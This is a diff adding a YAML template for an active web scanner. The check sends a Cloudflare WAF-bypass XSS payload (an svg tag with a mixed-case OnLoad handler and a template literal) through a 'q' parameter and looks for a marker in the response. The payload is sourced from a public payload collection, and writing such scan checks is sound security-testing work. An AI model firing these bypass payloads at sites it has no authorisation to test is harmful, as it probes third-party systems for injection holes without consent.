@@ -1,0 +1,20 @@
+id: patt-xss-cf-03-q
+name: 'PATT xss patt-xss-cf-03 via q'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafcloudflare
+description: 'PATT Cloudflare 21 Apr 2020: template literal + mixed case OnLoad. [patt:patt-xss-cf-03] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      q:
+        - '<svg/OnLoad="`${nxp0026}`">'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0026'
